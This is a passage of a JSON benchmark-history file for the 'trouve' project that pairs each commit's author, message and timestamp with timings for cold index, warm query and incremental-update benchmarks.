            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 71.39015518000001,
            "range": "± 1.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f3e73087b9fe724bce548d9f431b73fa4d80e00f",
          "message": "Render Markdown tables (#87)",
          "timestamp": "2026-07-19T17:01:07-04:00",
          "tree_id": "b0c22119d31d18d3f8aff12772254f2e85b57b54",
          "url": "https://github.com/jimsimon/trouve/commit/f3e73087b9fe724bce548d9f431b73fa4d80e00f"
        },
        "date": 1784494950799,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 137.32109754,
            "range": "± 4.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 73.45185104000002,
            "range": "± 3.1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 83.23637428,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 72.67995276,
            "range": "± 2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "afa788b9f6662991d0aab70c3d86ba3028b9daf3",
          "message": "Add Pull Request dashboard (#88)\n\n* Add pull request dashboard\n\nGive users an actionable, project-filtered view of review requests, drafts, pending reviews, merge-ready PRs, attention items, and recent merges. Persist accessible group ordering and expose the required workspace PR data through the versioned protocol.\n\n* Bound pull request dashboard requests\n\nLimit cross-workspace fan-out across repeated refreshes, cap PR pagination, and lower per-repository enrichment concurrency to avoid GitHub API request bursts.\n\n* Persist pull request dashboard snapshots\n\nRoute dashboard refreshes through the server event log, replace the state-returning GET with a command-only POST, and fold replayed snapshots in the client.",
          "timestamp": "2026-07-19T17:04:06-04:00",
          "tree_id": "c4d82c34fa080fcbf0933db5bb892dbf0a9c9e02",
          "url": "https://github.com/jimsimon/trouve/commit/afa788b9f6662991d0aab70c3d86ba3028b9daf3"
        },
        "date": 1784495124236,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 131.34109034000002,
            "range": "± 4.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 70.42422608,
            "range": "± 2.8",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 81.47966508000002,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 68.52702504000003,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "e1aaeb8f9928fb23d3a258956e2d52450c42d22f",
          "message": "Fix session list scrollbar jumps (#93)\n\n* Preserve session list scroll position\n\n* Restore focus after workspace reordering",
          "timestamp": "2026-07-19T18:43:28-04:00",
          "tree_id": "46baa9ed0b50dec1acc1f7a3ef7bca58b91fe0c9",
          "url": "https://github.com/jimsimon/trouve/commit/e1aaeb8f9928fb23d3a258956e2d52450c42d22f"
        },
        "date": 1784501090350,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 131.42379994,
            "range": "± 7.1",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 67.05787532000002,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.66363656,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.63440428,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "fd092dd19d6c436de9767b25014b59ee414cdf4b",
          "message": "Align Markdown table columns across rows (#98)",
          "timestamp": "2026-07-19T19:14:39-04:00",
          "tree_id": "de25a1a33e80850478ad600227644a246340d4ae",
          "url": "https://github.com/jimsimon/trouve/commit/fd092dd19d6c436de9767b25014b59ee414cdf4b"
        },
        "date": 1784503031456,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 133.15592666,
            "range": "± 989.6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 79.98444384000001,
            "range": "± 3.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 89.40135794000001,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 77.04245864,
            "range": "± 2.1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "fa586b1f126af811e10caad6410e4f71627b3a4b",
          "message": "Update all non-major dependencies (#54)\n\n* Update all non-major dependencies\n\n* Adapt non-major dependency updates\n\n---------\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>\nCo-authored-by: Codex <codex@openai.com>",
          "timestamp": "2026-07-19T19:17:55-04:00",
          "tree_id": "4f933552cd49a01cbcbd135173ccf7a887be7c55",
          "url": "https://github.com/jimsimon/trouve/commit/fa586b1f126af811e10caad6410e4f71627b3a4b"
        },
        "date": 1784503196056,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 130.79480414,
            "range": "± 7.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 72.66436658,
            "range": "± 2.8",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 82.33154476,
            "range": "± 2.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 70.81417872000002,
            "range": "± 0.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f3ef43f1bc731fec8eb12e3a261cab7dd0e66926",
          "message": "Add provider tabs and Kimi subscription usage (#81)\n\n* Add provider categories and Kimi usage\n\n* Harden provider usage endpoint validation\n\n* Update protocol snapshot after rebase",
          "timestamp": "2026-07-19T19:36:22-04:00",
          "tree_id": "01faca34b704e92d9ff0f44902c84a30200b5cfa",
          "url": "https://github.com/jimsimon/trouve/commit/f3ef43f1bc731fec8eb12e3a261cab7dd0e66926"
        },
        "date": 1784504338471,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 136.329516,
            "range": "± 9.1",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 75.82840918,
            "range": "± 2.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 86.38274194,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 75.2499976,
            "range": "± 2.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "d5fda70b286d47b58a584f3970e56ebde60ca474",
          "message": "Improve prompt composer controls (#72)\n\n* Improve prompt composer controls\n\n* Address prompt composer review feedback\n\n* Fix new chat Clippy lint\n\n* Harden permission mode selection\n\n* Allow attachment-only new chats",
          "timestamp": "2026-07-19T19:36:38-04:00",
          "tree_id": "1b9e0e0ad614136809ec3c2c31b9a4f05e7ce005",
          "url": "https://github.com/jimsimon/trouve/commit/d5fda70b286d47b58a584f3970e56ebde60ca474"
        },
        "date": 1784504427037,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 139.72453758,
            "range": "± 6.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 73.21617552000001,
            "range": "± 2.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 86.59520292,
            "range": "± 2.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 71.50054778,
            "range": "± 2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "03c407e00bb38fe717d2e1c11bce72c421627726",
          "message": "Lock file maintenance (#38)\n\n* Lock file maintenance\n\n* Pin plugin Node types for Bun declarations\n\n* Reconcile lockfiles with main\n\n---------\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>\nCo-authored-by: Codex <codex@openai.com>",
          "timestamp": "2026-07-19T19:56:44-04:00",
          "tree_id": "abda1cd2ea648af5163367bbcfac987cf25349d2",
          "url": "https://github.com/jimsimon/trouve/commit/03c407e00bb38fe717d2e1c11bce72c421627726"
        },
        "date": 1784505548960,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 127.0474439,
            "range": "± 25.2",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 58.79185528000001,
            "range": "± 2.6",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 77.74120482000001,
            "range": "± 9.3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 57.598679440000005,
            "range": "± 2.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "ee24df742f6a1b8a73d4262b982b511045a34037",
          "message": "Generate session titles offline (#96)",
          "timestamp": "2026-07-19T22:27:46-04:00",
          "tree_id": "9b8c303a19cd17e6543be3e402ffa488e99dad88",
          "url": "https://github.com/jimsimon/trouve/commit/ee24df742f6a1b8a73d4262b982b511045a34037"
        },
        "date": 1784514597539,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 106.47329214000001,
            "range": "± 841.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 59.062030799999995,
            "range": "± 0.5",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 103.98160406000001,
            "range": "± 27.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 56.86978294,
            "range": "± 0.8",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f47613187ba03eb2bcc42afc98ceda1a534eafcc",
          "message": "Preserve queued prompt editor during chat updates (#100)",
          "timestamp": "2026-07-19T22:30:20-04:00",
          "tree_id": "1296cd121d2eedd1066500deafd37284c132a064",
          "url": "https://github.com/jimsimon/trouve/commit/f47613187ba03eb2bcc42afc98ceda1a534eafcc"
        },
        "date": 1784514774275,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 132.67768952,
            "range": "± 6.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 67.80599436000001,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 79.11511526,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 66.67291572,
            "range": "± 2.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "a14b4ae52fa83ab64acde43cc620545204afacbb",
          "message": "Unify multi-instance GitHub PR data (#103)\n\n* Unify multi-instance GitHub PR data\n\nUse OAuth-only account feeds across configured GitHub instances so the dashboard, session indicators, and PR panel share one periodically refreshed snapshot. Add conflict and reviewer-state grouping plus a responsive two-column dashboard.\n\n* Fix stale GitHub integration comments\n\n* Address GitHub dashboard review feedback",
          "timestamp": "2026-07-20T00:21:52-04:00",
          "tree_id": "c882e784d31d860599c593a1dfa2148053608717",
          "url": "https://github.com/jimsimon/trouve/commit/a14b4ae52fa83ab64acde43cc620545204afacbb"
        },
        "date": 1784521459746,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 131.11923226,
            "range": "± 6.1",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 72.75893172,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 82.33285902000001,
            "range": "± 0.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 72.65528574,
            "range": "± 2.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "237a51c67cbeb09e055d5065e69b70d63054c831",
          "message": "Unify workspace session status indicators (#101)\n\n* Unify session status indicators\n\n* Show failed turns in session status",
          "timestamp": "2026-07-20T00:22:36-04:00",
          "tree_id": "c500463fa4c46554fcaff11e9e0acd6b101cd278",
          "url": "https://github.com/jimsimon/trouve/commit/237a51c67cbeb09e055d5065e69b70d63054c831"
        },
        "date": 1784521621470,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 138.59658310000003,
            "range": "± 7.3",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 74.66403284,
            "range": "± 3.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 79.99041326,
            "range": "± 0.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 69.88885272,
            "range": "± 2.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "d16385cbab37676311ffe79612c3bde42206b274",
          "message": "Fix merged UI and PR dashboard regressions (#107)\n\n* Fix merged UI and PR dashboard regressions\n\nKeep new-session pickers at their intended height and use a broadly supported pull-request glyph. Send bodyless command POSTs without a synthetic JSON payload, and avoid dashboard fan-out while connectivity is unavailable.\n\n* Keep composer action button compact\n\n* Bottom-align composer action button\n\n* Keep queued prompt action as Send now\n\n* Select Rustls crypto provider at startup\n\nThe desktop dependency graph enables both Ring and AWS-LC, so Rustls cannot infer a process provider and panics on the first GitHub HTTPS request. Install Ring explicitly before either client or embedded-server networking begins.\n\n* Harden empty POST transport test\n\nKeep loopback networking out of the default offline-safe suite and validate the request through HTTP framing instead of packet boundaries.\n\n* Run ignored client network test in CI\n\nExtend the gated TROUVE_E2E job and its coverage guard now that client-core intentionally owns an ignored loopback test.",
          "timestamp": "2026-07-20T00:55:46-04:00",
          "tree_id": "e512e7ae6f9e3d43b1d54613b59e3bf105ea140e",
          "url": "https://github.com/jimsimon/trouve/commit/d16385cbab37676311ffe79612c3bde42206b274"
        },
        "date": 1784523425001,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 122.29750720000001,
            "range": "± 2.9",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 65.3922578,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 74.73565592,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.06669686,
            "range": "± 1.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "070e408d5476ea86aa3be6b468d0b9775e2ab42f",
          "message": "Batch event-log appends through a dedicated writer thread (#97)\n\n* Batch event-log appends through a dedicated writer thread\n\nUnder many concurrent sessions, every streamed delta serialized on the\nStore's connection mutex with one fsync each. Slow drains backed up\nCodex turn routes until the shared stdout reader dropped them\n(ROUTE_CAPACITY overflow), failing otherwise-healthy turns with\n\"app-server event route closed before turn completed\".\n\nappend_event now queues to a single writer thread that commits all\npending appends in one transaction, then broadcasts and replies in\nqueue order. Callers keep the same blocking API and durability\nguarantee (return means committed), but no longer serialize each other,\nand the per-commit fsync amortizes across whatever queued under load.\nCursor/broadcast ordering now holds by construction: the writer thread\nis the sole author of both.\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Apply rustfmt\n\nCo-Authored-By: Claude Fable 5 <noreply@anthropic.com>\n\n* Test event writer failure handling\n\n---------\n\nCo-authored-by: Claude Fable 5 <noreply@anthropic.com>",
          "timestamp": "2026-07-20T01:19:53-04:00",
          "tree_id": "70139812417b07b049e9b5cc06980f9c777e49bf",
          "url": "https://github.com/jimsimon/trouve/commit/070e408d5476ea86aa3be6b468d0b9775e2ab42f"
        },
        "date": 1784524884304,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 130.75696316,
            "range": "± 11.3",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 62.62379226,
            "range": "± 2.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 82.61318206,
            "range": "± 2.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 61.31423534,
            "range": "± 2.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "df740abafb47606d0a3e3266012e3eb5638bd09d",
          "message": "Lock file maintenance (#109)\n\n* Lock file maintenance\n\n* Pin plugin Node types for Bun declarations\n\n* Reconcile lockfiles with main\n\n---------\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>\nCo-authored-by: Codex <codex@openai.com>",
          "timestamp": "2026-07-20T02:14:00-04:00",
          "tree_id": "70139812417b07b049e9b5cc06980f9c777e49bf",
          "url": "https://github.com/jimsimon/trouve/commit/df740abafb47606d0a3e3266012e3eb5638bd09d"
        },
        "date": 1784528129302,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 136.7024235,
            "range": "± 5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 77.92253854,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 90.84493082,
            "range": "± 3",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 76.59683938,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "3fb0ac15fb655ba225c7c9c984776bca626e1a26",
          "message": "Promote settings to sidebar navigation (#104)",
          "timestamp": "2026-07-20T02:14:38-04:00",
          "tree_id": "6b545ecd061c92ab5ffc83f1374dba40885f3913",
          "url": "https://github.com/jimsimon/trouve/commit/3fb0ac15fb655ba225c7c9c984776bca626e1a26"
        },
        "date": 1784528261953,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 147.39189612,
            "range": "± 7.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 77.53563700000002,
            "range": "± 1.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 90.0587187,
            "range": "± 2.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 77.20235676,
            "range": "± 1.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "f54ff1648be4a8cec0881ec92a8302631f2f0a30",
          "message": "Defer chat tail pinning to avoid Slint instantiation chain (#77)\n\n* Defer Slint chat tail pinning\n\n* Share chat tail position calculation",
          "timestamp": "2026-07-20T02:37:25-04:00",
          "tree_id": "e42d57f1862ab299fadc0f539eb1fc8ca26e72cc",
          "url": "https://github.com/jimsimon/trouve/commit/f54ff1648be4a8cec0881ec92a8302631f2f0a30"
        },
        "date": 1784529522448,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 130.85353438,
            "range": "± 3.9",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 66.41113338,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 77.23176082,
            "range": "± 0.7",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 65.47559312000001,
            "range": "± 2.2",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "847e3b0d9f9a58058130902a4ded10ee9dec875c",
          "message": "Tighten pull request dashboard spacing (#110)",
          "timestamp": "2026-07-20T02:41:10-04:00",
          "tree_id": "6fbdc97272b5c79539dc28c40246cf5b7a092b12",
          "url": "https://github.com/jimsimon/trouve/commit/847e3b0d9f9a58058130902a4ded10ee9dec875c"
        },
        "date": 1784529742955,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 121.43013576000001,
            "range": "± 7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 67.36844434,
            "range": "± 2.4",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 78.56182868,
            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 64.81926724,
            "range": "± 1.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c612e43e0524956f36710bdd5f7bc92862b81351",
          "message": "Update Rust crate serde_json to v1.0.151 (#112)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-20T02:53:17-04:00",
          "tree_id": "78cc4ad9e30a121733d6b3f3346d10887f0cd4be",
          "url": "https://github.com/jimsimon/trouve/commit/c612e43e0524956f36710bdd5f7bc92862b81351"
        },
        "date": 1784530493256,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 138.7920588,
            "range": "± 6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 79.47949777999999,
            "range": "± 2.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 89.07257754,
            "range": "± 2.4",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 75.3626708,
            "range": "± 1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c1ea35518dbaed65c6847782b71bdaeface9013e",
          "message": "Add workspace close action (#70)\n\n* Add workspace close action\n\nKeep sessions and worktrees intact when a workspace is closed, and reopen it when the same folder is registered again. Expose the lifecycle over the versioned protocol and consolidate workspace header actions into an overflow menu.\n\n* Address workspace close review feedback\n\nRefresh workspace state from server lifecycle events so multiple clients stay synchronized. Add HTTP coverage for closing, hiding, and reopening a workspace.\n\n* Update OpenAPI snapshot after rebase\n\n* Keep closed workspace state consistent\n\nReset all session-derived panels when closing the active workspace, resynchronize the home workspace for local and remote lifecycle changes, and reject new session or automation activity until a closed workspace is reopened.\n\n* Clear active session on remote workspace close\n\nShare the complete session-derived UI reset between direct and server-event workspace closure paths.",
          "timestamp": "2026-07-20T02:54:00-04:00",
          "tree_id": "a968832695f8a934e89c5cae8f632ce344edec20",
          "url": "https://github.com/jimsimon/trouve/commit/c1ea35518dbaed65c6847782b71bdaeface9013e"
        },
        "date": 1784530612895,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 136.98095436000003,
            "range": "± 14.7",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 75.41981894,
            "range": "± 2.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 87.06318678000001,
            "range": "± 1.1",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 75.24582962000001,
            "range": "± 3.7",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "71294e4e74f79c66902f4950f0c97ea811ba837e",
          "message": "Associate pull requests with session activity (#89)\n\n* Associate pull requests with session activity\n\n* Address pull request review feedback\n\n* Keep session pull requests scoped\n\nPreserve cross-branch PRs returned by the session-specific lookup across account dashboard refreshes, while limiting new associations to successful PR creation or remote-ref mutation activity. Read/list output and incidental mentions no longer associate unrelated PRs.",
          "timestamp": "2026-07-20T03:24:39-04:00",
          "tree_id": "42b87f40cb49b9ad3e61afc95e6352cacd8b2ff5",
          "url": "https://github.com/jimsimon/trouve/commit/71294e4e74f79c66902f4950f0c97ea811ba837e"
        },
        "date": 1784532357947,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 108.48446252000001,
            "range": "± 4.9",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 57.548999259999995,
            "range": "± 0.9",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 68.99359706000001,
            "range": "± 4.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 55.63845296,
            "range": "± 2.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "1b500c7f01034524913794dd76f78cc072ea5c89",
          "message": "Fix Spectacle image paste on Wayland (#113)\n\nEnable arboard's native Wayland data-control backend so KDE Spectacle screenshots are visible to every shared prompt input. Keep the existing X11 fallback for other Linux sessions.",
          "timestamp": "2026-07-20T03:29:01-04:00",
          "tree_id": "afca046f6107496a23323f594147ea841e922b6f",
          "url": "https://github.com/jimsimon/trouve/commit/1b500c7f01034524913794dd76f78cc072ea5c89"
        },
        "date": 1784532619573,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 136.54599320000003,
            "range": "± 5.6",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 72.13872512,
            "range": "± 3.2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 84.45920242000001,
            "range": "± 1.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 70.08329656,
            "range": "± 3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "bbc3de26f5405f9ab5226f4c52186d4dba514623",
          "message": "Ignore retired events during replay (#111)",
          "timestamp": "2026-07-20T03:31:05-04:00",
          "tree_id": "820123733f7d7425eb034410035e705aa33d439c",
          "url": "https://github.com/jimsimon/trouve/commit/bbc3de26f5405f9ab5226f4c52186d4dba514623"
        },
        "date": 1784532750836,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 121.53324008000001,
            "range": "± 8.3",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 64.74690134,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
